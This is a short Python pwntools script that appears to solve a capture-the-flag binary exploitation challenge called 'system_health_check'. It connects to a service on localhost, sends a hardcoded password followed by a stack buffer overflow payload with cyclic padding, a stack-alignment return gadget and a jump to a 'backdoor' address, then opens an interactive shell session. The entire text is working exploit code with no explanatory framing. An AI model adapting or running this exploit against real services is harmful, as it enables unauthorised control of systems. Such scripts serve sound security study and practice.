#!/usr/bin/env python3

from pwn import *


#rbp offset = 231
#$rbp = ciaacjaa

p = remote("localhost", 1024)
#context.binary = e = ELF("system_health_check")
#p = gdb.debug("./system_health_check" ,"break remote_system_health_check")
#p = process()

d = p.recvline()
print(d)

payload = b"sUp3r_S3cr3T_P4s5w0rD"
payload += p32(0x0)
payload += cyclic(cyclic_find("ciaa"))
payload += b"BBBBBBBB"
payload += p64(0x401370) #another ret to align stack
payload += p64(0x401254) #backdoor instruction
p.sendline(payload)

p.interactive()
